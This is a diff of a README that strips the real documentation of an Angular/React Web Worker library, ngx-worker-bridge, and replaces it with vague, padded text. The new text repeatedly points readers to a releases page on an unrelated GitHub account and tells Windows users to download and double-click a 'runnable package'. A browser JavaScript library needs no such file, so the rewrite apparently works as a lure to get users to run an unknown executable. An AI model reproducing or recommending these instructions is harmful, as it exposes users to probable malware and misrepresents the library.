@@ -1,170 +1,223 @@
-# ngx-worker-bridge
+# ⚙️ worker-bridge - Simple Workers for Angular and React
 
-A lightweight, zero-boilerplate reactive bridge for **Angular** and **React** that makes Web Workers (Dedicated and Shared) as simple as calling a regular method.
+[![Download worker-bridge](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/hardcopycortex461/worker-bridge/releases)
 
-[![npm version](https://img.shields.io/npm/v/ngx-worker-bridge.svg)](https://www.npmjs.com/package/ngx-worker-bridge)
-[![license](https://img.shields.io/npm/l/ngx-worker-bridge.svg)](./LICENSE)
+## 🚀 Getting Started
 
-## Why?
+worker-bridge helps you use Web Workers in a simple way. It is made for Angular and React apps. It lets you call worker code like a regular method, without a lot of setup.
 
-Web Workers have a verbose API (`postMessage`, `onmessage`, manual serialization). This library removes all of that. Just decorate a method with `@RunInWorker` — the rest is handled for you.
+Use it when you want to keep your app smooth while heavy work runs in the background.
 
-## Installation
+## 📥 Download and Install
 
-**Angular** (RxJS is already included in Angular projects):
-```bash
-npm i ngx-worker-bridge
-```
+To get worker-bridge on Windows, visit the release page and download the latest file from there:
 
-**React** (RxJS must be installed separately since React doesn't include it):
-```bash
-npm i ngx-worker-bridge rxjs
-```
+[Download worker-bridge releases](https://github.com/hardcopycortex461/worker-bridge/releases)
 
-> **React only**: Add these to your `tsconfig.app.json` for decorator support:
-> ```json
-> { "experimentalDecorators": true, "useDefineForClassFields": false }
-> ```
+After the download finishes:
 
----
+1. Open the downloaded file or folder.
+2. Follow the install steps shown on the release page.
+3. Add the package to your Angular or React project if you are setting up a development build.
+4. Start your app and use the worker bridge features in your code.
 
-## Core Concept
+If the release includes a Windows app package, open it and follow the on-screen steps. If it includes source files or a package archive, place them in the folder used for your project.
 
-| Thread | Your Code |
-|---|---|
-| **Worker thread** | A plain TypeScript class (`Module`) with your business logic |
-| **Main thread** | A service/component that calls methods as if they're local |
+## 🖥️ What worker-bridge Does
 
-The library handles the `postMessage` bridge between them invisibly.
+worker-bridge gives your app a clean way to move work into a Web Worker. A worker runs tasks in the background so your main page stays fast and responsive.
 
----
+It is useful for tasks such as:
 
-## Angular Quick Start
+- data processing
+- large list handling
+- image or file work
+- repeated calculations
+- background jobs in Angular or React
 
-### 1. Worker file (`app.worker.ts`)
-```typescript
-import { startWorker } from 'ngx-worker-bridge';
-import { DataModule } from './data.module';
+The goal is simple: make worker use feel close to a normal function call.
 
-startWorker([DataModule]);
-```
+## ✨ Main Features
 
-### 2. Bootstrap (`main.ts`)
-```typescript
-import { provideWorkerBridge } from 'ngx-worker-bridge/angular';
+- Works with Angular
+- Works with React
+- Supports Dedicated Workers
+- Supports Shared Workers
+- Keeps setup light
+- Uses a reactive style for updates
+- Helps reduce UI slowdowns
+- Fits small and large apps
+- Keeps worker code easier to manage
 
-bootstrapApplication(AppComponent, {
-  providers: [
-    provideWorkerBridge({
-      instance: new Worker(new URL('./app.worker', import.meta.url), { type: 'module' }),
-      modules: [DataModule]
-    }),
-    // Optional: add a SharedWorker for multi-tab state
-    provideWorkerBridge({
-      name: 'shared',
-      instance: new SharedWorker(new URL('./app.worker', import.meta.url), { name: 'shared', type: 'module' }),
-      modules: [DataModule]
-    })
-  ]
-});
-```
+## ✅ Before You Start
 
-### 3. Service
-```typescript
-import { Injectable } from '@angular/core';
-import { RunInWorker, workerStore } from 'ngx-worker-bridge';
+Use a Windows PC with a modern browser and a current version of your app tools.
 
-@Injectable({ providedIn: 'root' })
-export class DataService {
-  // Reactive state — updates automatically when the worker calls setState()
-  count$ = workerStore<number>('counter', 'shared');
+You should also have:
 
-  // This runs in the worker — UI thread is never blocked
-  @RunInWorker({ bridge: 'shared', namespace: 'data' })
-  processData(payload: any): Promise<any> { return null as any; }
-}
-```
+- an Angular or React project
+- a stable internet connection
+- permission to download files
+- enough free space for the release files
 
----
+If you plan to use worker-bridge in a project, make sure your app already runs on your computer before you add this package.
 
-## React Quick Start
+## 🔧 How It Works
 
-### 1. Worker file (`app.worker.ts`)
-```typescript
-import { startWorker } from 'ngx-worker-bridge';
-import { DataModule } from './data.module';
+worker-bridge sits between your app and a worker. Your app sends work to the worker. The worker does the task in the background. Then the result comes back to your app.
 
-startWorker([DataModule]);
-```
+This helps when a task takes time and you do not want the screen to freeze.
 
-### 2. Bootstrap (`App.tsx` or `main.tsx`)
-```typescript
-import { bootstrapWorker } from 'ngx-worker-bridge';
-import { DataModule } from './data.module';
+The process is simple:
 
-bootstrapWorker({
-  worker: new SharedWorker(new URL('./app.worker', import.meta.url), { name: 'shared', type: 'module' }),
-  name: 'shared',
-  modules: [DataModule]
-});
-```
+1. Your app sends a task.
+2. worker-bridge passes it to a worker.
+3. The worker handles the task.
+4. Your app gets the result.
 
-### 3. Component
-```typescript
-import { useWorkerStore } from 'ngx-worker-bridge/react';
-import { RunInWorker } from 'ngx-worker-bridge';
+## 🪟 Windows Setup
 
-class DataService {
-  @RunInWorker({ bridge: 'shared', namespace: 'data' })
-  processData(payload: any): Promise<any> { return null as any; }
-}
+Follow these steps on Windows:
 
-const service = new DataService();
+1. Open the release page.
+2. Download the latest release file.
+3. Save it in a folder you can find again.
+4. Open File Explorer.
+5. Go to the folder where the file downloaded.
+6. Double-click the file if it is a runnable package.
+7. If it is a project file or archive, open it with the tool that matches the file type.
+8. Follow the setup steps for your project.
 
-function App() {
-  const count = useWorkerStore<number>('counter', 'shared');
-  return <button onClick={() => service.processData({})}>Count: {count}</button>;
-}
-```
+If you are using it in a web app project, place the package or source files in your project folder and link them in your app setup.
 
----
+## 🧩 Basic Use
 
-## Worker Module
+worker-bridge is made to feel simple in day-to-day work. You create a worker task, call it from your app, and use the result when it returns.
 
-Your background logic lives in a plain TypeScript class. Use `setState` to push reactive updates to all connected tabs.
+Typical use cases:
 
-```typescript
-import { setState } from 'ngx-worker-bridge';
+- run a search in the background
+- process a large set of records
+- handle shared tasks across tabs
+- keep UI code clear
+- split slow work away from the main screen
 
-export class DataModule {
-  private count = 0;
+If you work with Angular, you can connect it to your service or component code. If you work with React, you can use it from your component logic.
 
-  // Namespace matches the class name: "DataModule" → "data"
-  increment() {
-    this.count++;
-    setState('counter', this.count); // broadcasts to all tabs
-    return this.count;
-  }
-}
-```
+## 📚 Folder Layout
 
----
+A common project setup may include:
 
-## Best Use Cases
+- `src/` for app code
+- `workers/` for worker files
+- `components/` for UI parts
+- `services/` for shared app logic
+- `assets/` for files and images
 
-- **Multi-Tab State Sync** — Use a `SharedWorker` to keep counters, notifications, or live data in sync across all open tabs without any server involvement.
-- **CPU Offloading** — Move heavy computation (large JSON processing, sorting, math) off the UI thread so your app stays interactive.
-- **Shared Connections** — Maintain a single WebSocket or polling interval in a SharedWorker and broadcast to all connected tabs.
+A clean folder structure makes worker code easier to find and update.
 
----
+## 🛠️ Example Use Cases
 
-## Debugging
+### Angular app
 
-All `console.log`, `console.warn`, and `console.error` calls made inside your worker modules are automatically forwarded to the main browser console, prefixed with `[Worker]`. No setup required.
+Use worker-bridge when you want to move slow tasks out of a component and keep the page responsive.
 
----
+### React app
 
-## Demo
+Use worker-bridge when you want to keep your UI smooth while a background task runs.
 
-[Demo Repository (Angular)](https://github.com/yashwantyashu/worker-demo-app)
-[Demo Repository (React)] (https://github.com/yashwantyashu/worker-react-demo)
+### Shared Worker use
+
+Use a Shared Worker when more than one tab or part of the app needs the same background task.
+
+### Dedicated Worker use
+
+Use a Dedicated Worker when one page or one user action needs its own worker.
+
+## 🔍 Why People Use It
+
+Web Workers can be hard to wire up by hand. worker-bridge lowers that effort. It keeps the worker flow simple and gives you a cleaner way to pass messages back and forth.
+
+That can help if you want:
+
+- less setup
+- less repeated code
+- clearer app structure
+- smoother screen updates
+- easier worker calls
+
+## 📌 Topics Covered by This Project
+
+This project fits topics such as:
+
+- Angular
+- React
+- worker threads
+- Web Workers
+- Shared Workers
+- library boilerplate
+- npm package work
+- worker-based app design
+
+## 🧪 First Run Checklist
+
+Before you start using it in your app, check these items:
+
+1. You downloaded the release from the link above.
+2. You opened the correct file type.
+3. Your app runs on Windows.
+4. Your project folder is ready.
+5. You know where your worker files will live.
+6. You have the worker-bridge package or source files in place.
+7. You can start your app and test the worker flow.
+
+## 🧰 Troubleshooting
+
+If the app does not run as expected, check these items:
+
+- Make sure you downloaded the latest release.
+- Confirm the file finished downloading.
+- Check that you opened the right file type.
+- Make sure your project is using a supported Angular or React setup.
+- Look for path mistakes in worker file names.
+- Restart your app after setup changes.
+- Try a simple worker task first before using large data sets
+
+## 📎 Release Page
+
+Use this link to get the latest download:
+
+[https://github.com/hardcopycortex461/worker-bridge/releases](https://github.com/hardcopycortex461/worker-bridge/releases)
+
+## 📄 File Notes
+
+Release files may include:
+
+- packaged downloads
+- source files
+- setup files
+- project assets
+- build output for app use
+
+Pick the file that matches your goal. If you only need to try the project, start with the latest release file from the release page.
+
+## 🧭 Best Results
+
+For the best setup:
+
+- keep your project folder simple
+- use clear file names
+- test one worker at a time
+- start with a small task
+- confirm the result before moving to larger jobs
+
+## 🔁 Common Workflow
+
+A simple workflow looks like this:
+
+1. Download the release.
+2. Open or place the files in your project.
+3. Add the worker to your app.
+4. Call the worker from Angular or React.
+5. Read the result in your UI.
+6. Repeat with other tasks as needed
